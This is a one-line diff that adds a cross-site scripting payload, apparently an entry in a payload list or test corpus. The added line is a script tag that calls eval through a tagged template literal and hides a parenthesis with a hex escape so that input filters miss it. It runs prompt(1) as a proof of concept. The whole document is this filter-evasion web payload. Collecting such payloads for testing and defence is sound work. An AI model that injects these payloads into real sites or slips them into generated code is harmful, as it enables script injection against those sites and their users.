@@ -1,0 +1,1 @@
+<script>eval.call`${'prompt\x281)'}`</script>
